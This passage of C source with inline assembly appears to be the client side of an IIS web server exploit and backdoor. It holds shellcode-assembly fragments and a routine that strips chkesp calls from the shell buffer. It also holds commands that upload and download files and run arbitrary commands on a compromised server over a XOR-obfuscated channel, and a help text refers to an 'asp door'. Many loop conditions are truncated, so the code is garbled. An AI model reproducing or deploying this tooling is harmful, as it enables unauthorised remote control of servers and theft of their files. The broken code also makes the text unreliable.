            mov dword ptr [eax],0x11223344  //stradd-0xe
            xor eax,eax //2
            ret //1
            execptprogram:     jmp errprogram //2 bytes  stradd-7
            nextcall:         call getstradd //5 bytes
            NOP
            NOP
            NOP
            NOP
            NOP
            NOP
            NOP
            NOP
            NOP
            }
    }
 


    void cleanchkesp(char *fnadd,char *shellbuff,char * chkesp,int len)
    { 
        int i,k;
        unsigned char temp;
        char *calladd;

        for(i=0;i
                temp=shellbuff[i];
            if(temp==0xe8){
                k=*(int *)(shellbuff+i+1);
                calladd=fnadd;
                calladd+=k;
                calladd+=i;
                calladd+=5;
                if(calladd==chkesp){
                    shellbuff[i]=0x90;
                    shellbuff[i+1]=0x43;   // inc ebx
                    shellbuff[i+2]=0x4b; // dec ebx
                    shellbuff[i+3]=0x43;
                    shellbuff[i+4]=0x4b;
                }
            }
                }
    }



    void iisput(int fd,char *str){
 
        char *filename;
        char *filename2;
        FILE *fpt;
        char buff[0x2000];
        int size=0x2000,i,j,filesize,filesizehigh;

        filename="\0";
        filename2="\0";
        j=strlen(str);
        for(i=0;i
                if(*str!=' '){
                    filename=str;
                    break;
                } 
                }
        for(;i
                if(*str==' ') {
                    *str=0;
                    break;
                }
                }
        ++i;
        ++str;
        for(;i
                if(*str!=' '){
                    filename2=str;
                    break;
                }
                }
        for(;i
                if(*str==' ') {
                    *str=0;
                    break;
                }
                }


        if(filename=="\x0") {
            printf("\n iisput filename [path\\fiename]\n");  
            return;
        }
        if(filename2=="\x0") filename2=filename;
 
        printf("\n begin put file:%s",filename);

        j=0;
        ioctlsocket(fd, FIONBIO, &j);


        Sleep(1000);
 
        fpt=CreateFile(filename,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0); 
        filesize=GetFileSize(fpt,&filesizehigh);
        strcpy(buff,"put ");
        *(int *)(buff+4)=filesize;
        filesize=*(int *)(buff+4);
        strcpy(buff+0x8,filename2);
        newsend(fd,buff,i+0x9,0);
        printf("\n put file:%s to file:%s %d bytes",filename,filename2,filesize);
        Sleep(1000);

        while(filesize>0){
            size=0x800;
            ReadFile(fpt,buff,size,&size,NULL); 
            if(size>0){
                filesize-=size;
                newsend(fd,buff,size,0);
//      Sleep(0100);
    
            }
        }

// size=filesize;
// ReadFile(fpt,buff,size,&size,NULL); 
// if(size>0) send(fd,buff,size,0);

        CloseHandle(fpt);
        j=1;
        ioctlsocket(fd, FIONBIO, &j);
 
        printf("\n put file ok!\n");
        Sleep(1000);

    }



    void iisget(int fd,char *str){
 
        char *filename;
        char *filename2;
        FILE *fpt;
        char buff[0x2000];
        int size=0x2000,i,j,filesize,filesizehigh;

        filename="\0";
        filename2="\0";
        j=strlen(str);
        for(i=0;i
                if(*str!=' '){
                    filename=str;
                    break;
                } 
                }
        for(;i
                if(*str==' ') {
                    *str=0;
                    break;
                }
                }
        ++i;
        ++str;
        for(;i
                if(*str!=' '){
                    filename2=str;
                    break;
                }
                }
        for(;i
                if(*str==' ') {
                    *str=0;
                    break;
                }
                }


        if(filename=="\x0") {
            printf("\n iisget filename [path\\fiename]\n");  
            return;
        }
        if(filename2=="\x0") filename2=filename;
 
        printf("\n begin get file:%s",filename);
 
        fpt=CreateFileA(filename,FILE_FLAG_WRITE_THROUGH+GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0); 
        strcpy(buff,"get ");
        strcpy(buff+0x4,filename2);
        newsend(fd,buff,i+0x5,0);
        printf("\n get file:%s from file:%s",filename,filename2);
 
        j=0;
        ioctlsocket(fd, FIONBIO, &j);

        i=0;
        filesize=0;



        j=0;
        while(j<100){
 
//    Sleep(100);
            i=newrecv(fd,buff,0x800,0);
            if(i>0){
                buff[i]=0;
                if(memcmp(buff,"size",4)==0){
                    filesize=*(int *)(buff+4);
                    j=100;
                }
                else {
                    j=0;
                    printf("\n recv %s",buff);
                }
            }
            else ++j;
// if(j>1000) i=0;
        }
        printf("\n file %d bytes %d\n",filesize,i);
        if(i>8){
            i-=8;
            filesize-=i;
            WriteFile(fpt,buff+8,i,&i,NULL);
     
        }
 
        while(filesize>0){
            size=newrecv(fd,buff,0x800,0);
            if(size>0){
                filesize-=size;
                WriteFile(fpt,buff,size,&size,NULL); 
         
            }
            else {
                if(size==0) {
                    printf("\n ftp close \n "); 

                }
                else {
                    printf("\n Sleep(100)");
                    Sleep(100);
                }
            }
 
        }
        CloseHandle(fpt);
        printf("\n get file ok!\n");

        j=1;
        ioctlsocket(fd, FIONBIO, &j);

    }


    void iisreset(int fd,char *str){

        char buff[0x2000];
        int  i,j;
        printf("\nreset xor data.\n");
        Sleep(1000);
        j=0;
        ioctlsocket(fd, FIONBIO, &j);
        strcpy(buff,"reset");
        newsend(fd,buff,strlen(buff),0);
        Sleep(1000);

   

        lockintvar1=LOCKBIGNUM2%LOCKBIGNUM;
        lockintvar2=lockintvar1;


        while(1){
            j=recv(fd,buff,0x2000,0);
            if(j>0){
                buff[j]=0;
                for(i=0;i
                        if(buff[i]==0) buff[i]='b';
                    }
//   printf("\nrecv 0x%x bytes:%s",j,buff);
                if(strstr(buff,"xordatareset")!=0){
                    printf("\nxor data reset ok.\n");

                    for(i=strstr(buff,"xordatareset")-buff+0x0c;i
                            lockintvar1=lockintvar1*0x100;
                        lockintvar1=lockintvar1%LOCKBIGNUM;
                        lockcharvar=lockintvar1%0x100;
                        buff[i]^=lockcharvar;   // DATAXORCODE;
                        }

                    break;
                }
            }
//   else if(j==0) break;
//   strcpy(buff,"\r\nmkdir d:\\test6\r\n");
//     newsend(fd,buff,strlen(buff),0);
        }
        Sleep(1000);
        j=1;
        ioctlsocket(fd, FIONBIO, &j);
//    printf("aaa");
    }



    void iisdie(int fd,char *str){

        char buff[0x200];
        int  j;
        printf("\niis die.\n");
        j=0;
        ioctlsocket(fd, FIONBIO, &j);
        Sleep(1000);
        strcpy(buff,"iisrr ");
        newsend(fd,buff,strlen(buff),0);
        Sleep(1000);
        j=1;
        ioctlsocket(fd, FIONBIO, &j);
        lockintvar1=LOCKBIGNUM2%LOCKBIGNUM;
        lockintvar2=lockintvar1;
    }



    void iiscmd(int fd,char *str){

        char *cmd="\0";
        char buff[2000];
        int  i,j;

        j=strlen(str);
        for(i=0;i
                if(*str!=' '){
                    cmd=str;
                    break;
                } 
                }
        j=strlen(str);
        for(i=0;i
                if(*(str+j-i-1)!=' ') {
                    break;
                }
                else *(str+j-i-1)=0;
            }
  
        if(cmd=="\x0") {
            printf("\niiscmd cmd\n");  
            return;
        }
 
        printf("\nbegin run cmd:%s",cmd);
        j=0;
        ioctlsocket(fd, FIONBIO, &j);
        Sleep(1000);
        strcpy(buff,"iisc ");
        strcat(buff,cmd);
        newsend(fd,buff,strlen(buff),0);
        Sleep(1000);
        j=1;
        ioctlsocket(fd, FIONBIO, &j);


    }







    int newrecv(int fd,char *buff,int size,int flag){
    
        int i,k;
        k=recv(fd,buff,size,flag);

        if(xordatabegin==1){
            for(i=0;i
                    lockintvar1=lockintvar1*0x100;
                lockintvar1=lockintvar1%LOCKBIGNUM;
                lockcharvar=lockintvar1%0x100;
                buff[i]^=lockcharvar;   // DATAXORCODE;
                }
    
        }
        else{
            if(k>0){
                buff[k]=0;
                if(strstr(buff,"XORDATA")!=0) {
                    xordatabegin=1;
                    for(i=strstr(buff,"XORDATA")-buff+8;i
                            lockintvar1=lockintvar1*0x100;
                        lockintvar1=lockintvar1%LOCKBIGNUM;
                        lockcharvar=lockintvar1%0x100;
                        buff[i]^=lockcharvar;   // DATAXORCODE;
                        }
                }
            }
        }
        return(k);


    }

    int newsend(int fd,char *buff,int size,int flag){
        int i;
        for(i=0;i
                lockintvar2=lockintvar2*0x100;
            lockintvar2=lockintvar2%LOCKBIGNUM;
            lockcharvar=lockintvar2%0x100;
            buff[i]^=lockcharvar;   // DATAXORCODE;
            //            buff[i]^=DATAXORCODE;
            }

        return(send(fd,buff,size,flag));   

    }





    void iishelp(){

        printf("\nusage:");
        printf("\niisget filename filename.  get file from web server.");
        printf("\niisput filename filename.  put file to web server.");
        printf("\niiscmd cmd.  run cmd on web server.");
        printf("\niisreset.  reset the xor data.");
        printf("\niisdie.  reset the asp door.");
        printf("\n\n");

    }
